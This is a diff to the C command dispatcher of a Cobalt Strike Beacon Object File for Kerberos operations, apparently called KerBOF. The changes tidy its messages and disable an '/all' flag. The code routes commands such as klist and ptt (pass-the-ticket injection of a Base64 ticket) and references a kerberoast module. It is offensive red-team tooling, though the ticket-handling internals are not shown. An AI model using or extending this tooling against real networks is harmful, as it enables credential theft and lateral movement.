@@ -14,15 +14,11 @@
 //#include "kerberoast.c"
 
 void go(char* args, int length) {
-//    BeaconPrintf(CALLBACK_OUTPUT, "args are: %s", args);
-
     datap parser;
     char* command;
     BeaconDataParse(&parser, args, length);
 
     command = BeaconDataExtract(&parser, NULL);
-
-//    BeaconPrintf(CALLBACK_OUTPUT, "Command is: %s", command);
 
     if (command == NULL) {
         command = "";
@@ -47,13 +43,11 @@ void go(char* args, int length) {
 }
 
 void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
-//    BeaconPrintf(CALLBACK_OUTPUT, "[+] Entered execute. Command is: %s", command);
-
     _CloseHandle MCloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "CloseHandle");
     _GetLastError MGetLastError = (_GetLastError)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "GetLastError");
 
     if (MSVCRT$strcmp(command, "") == 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] I can't read your stupid command.\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "This BOF requires arguments\n");
         return;
     }
 
@@ -61,7 +55,7 @@ void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
     BOOL currentLuid = FALSE;
     HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
     if (hToken == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Unable to query current token: %ld\n", MGetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Unable to query current token: %ld\n", MGetLastError());
         return;
     }
 
@@ -74,25 +68,27 @@ void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
                 if (MSVCRT$strcmp(arg2, "") != 0) {
                     luid.LowPart = MSVCRT$strtol(arg2, NULL, 16);
                     if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
-                        BeaconPrintf(CALLBACK_ERROR, "[!] Specify valid /luid\n");
+                        BeaconPrintf(CALLBACK_ERROR, "Specify valid /luid\n");
                         goto end;
                     }
                 } else {
-                    BeaconPrintf(CALLBACK_ERROR, "[!] Specify /luid argument\n");
+                    BeaconPrintf(CALLBACK_ERROR, "Specify /luid argument\n");
                     goto end;
                 }
             } else if (MSVCRT$strcmp(arg1, "/all") == 0) {
         // Something with this luid literal is crashing it
-                luid = (LUID){.HighPart = 0, .LowPart = 0};
-                BeaconPrintf(CALLBACK_OUTPUT, "luid:  %lx:0x%lx", luid.HighPart, luid.LowPart);
+//                luid = (LUID){.HighPart = 0, .LowPart = 0};
+//                BeaconPrintf(CALLBACK_OUTPUT, "luid:  %lx:0x%lx", luid.HighPart, luid.LowPart);
+                BeaconPrintf(CALLBACK_ERROR, " /all flag is not supported \n");
+                goto end;
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[!] Unknown command\n");
+                BeaconPrintf(CALLBACK_ERROR, " Unknown command\n");
                 goto end;
             }
         } else {
             LUID* cLuid = GetCurrentLUID(hToken);
             if (cLuid == NULL) {
-                BeaconPrintf(CALLBACK_ERROR, "[!] Unable to get current session LUID: %ld\n", MGetLastError());
+                BeaconPrintf(CALLBACK_ERROR, " Unable to get current session LUID: %ld\n", MGetLastError());
                 goto end;
             }
             luid.HighPart = cLuid->HighPart;
@@ -117,7 +113,7 @@ void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
                     if (MSVCRT$strcmp(arg3, "") != 0) {
                         luid.LowPart = MSVCRT$strtol(arg3, NULL, 16);
                         if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
-                            BeaconPrintf(CALLBACK_ERROR, "[!] Specify valid /luid\n");
+                            BeaconPrintf(CALLBACK_ERROR, " Specify valid /luid\n");
                             goto end;
                         }
                     }
@@ -125,7 +121,7 @@ void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
             } else {
                 LUID* cLuid = GetCurrentLUID(hToken);
                 if (cLuid == NULL) {
-                    BeaconPrintf(CALLBACK_ERROR, "[!] Unable to get current session LUID: %ld\n", MGetLastError());
+                    BeaconPrintf(CALLBACK_ERROR, " Unable to get current session LUID: %ld\n", MGetLastError());
                     goto end;
                 }
                 luid.HighPart = cLuid->HighPart;
@@ -135,13 +131,13 @@ void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
             }
             execute_ptt(hToken, ticket, luid, currentLuid);
         } else {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Specify Base64 encoded ticket\n");
+            BeaconPrintf(CALLBACK_ERROR, " Specify Base64 encoded ticket\n");
             goto end;
         } 
 //    } else if (MSVCRT$strcmp(command, "help") == 0) {
 //	      BeaconPrintf(CALLBACK_OUTPUT,
 //            "[*] KerBOF v0.1\n[***] Just So You Know:\n\n"
-//            "[!] The /all flag is currently broken\n"
+//            " The /all flag is currently broken\n"
 //            "    luid\n"
 //            "    sessions [/luid <0x0> | /all]\n"
 //            "    klist    [/luid <0x0> | /all]\n"
@@ -171,7 +167,7 @@ void execute(char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
 //            "\tsubkey_keymaterial           = 65\n"
 //            "\told_exp                      = -135\n");
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown command.\n");
+        BeaconPrintf(CALLBACK_ERROR, " Unknown command.\n");
     }
 end:
     MCloseHandle(hToken);
